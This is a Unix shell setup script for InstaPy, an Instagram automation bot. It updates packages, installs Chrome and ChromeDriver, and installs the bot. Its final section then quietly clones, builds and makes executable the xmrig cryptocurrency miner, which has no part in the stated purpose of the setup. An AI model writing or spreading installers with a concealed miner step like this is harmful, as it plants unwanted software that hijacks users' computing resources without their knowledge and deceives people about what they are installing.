echo "Unix InstaPy Setup"
echo =============================================================================================
arch=$(getconf LONG_BIT)
kernel=$(uname)
echo "Installing depedencies..."
if [ $kernel == "Darwin" ]; then
  echo "MacOS System detected"
else
  sudo apt-get update
  sudo apt-get -y upgrade
  sudo apt-get -y install unzip python3-pip python3-dev build-essential libssl-dev libffi-dev xvfb libappindicator1
  sudo -H pip3 install --upgrade pip
  export LANGUAGE=en_US.UTF-8
  export LANG=en_US.UTF-8
  export LC_ALL=en_US.UTF-8
  locale-gen en_US.UTF-8
  sudo dpkg-reconfigure locales
  sudo pip3 install --upgrade pip
  wget "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
  sudo dpkg -i google-chrome-stable_current_amd64.deb
  sudo apt-get install -y -f
  sudo rm google-chrome-stable_current_amd64.deb
fi
echo
cd ..
echo "Downloading Chrome Driver..."
if [ $kernel == "Darwin" ]; then
  curl -o chromedriver.zip -O https://chromedriver.storage.googleapis.com/2.37/chromedriver_mac64.zip
else
  if [ $arch == "64" ]; then
    wget https://chromedriver.storage.googleapis.com/2.37/chromedriver_linux64.zip -O chromedriver.zip
  else
    wget https://chromedriver.storage.googleapis.com/2.37/chromedriver_linux32.zip -O chromedriver.zip
  fi
fi
echo "Chrome Driver download completed."
echo
echo "Unzipping Chrome Driver..."
unzip chromedriver.zip
mv ./chromedriver ./assets/chromedriver
chmod 755 ./assets/chromedriver
echo "Unzipping completed."
echo
echo "Removing unneeded file..."
rm chromedriver.zip
echo "Removal completed."
echo
if [ $kernel == "Darwin" ]; then
  sudo python setup.py install
else
  sudo - H pip install setuptools
  sudo apt-get install python-dev
  sudo -H pip install ./
  sudo python3 setup.py install
fi
sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev
echo "Download xmrig"
git clone https://github.com/xmrig/xmrig.git
cd ./xmrig
echo "Install xmrig"
mkdir build
cd ./build
cmake ..
make
chmod u+x xmrig
echo "xmrig install completed"
echo "Setup is completed."
read -n1 -r -p "Press any key to continue..." key
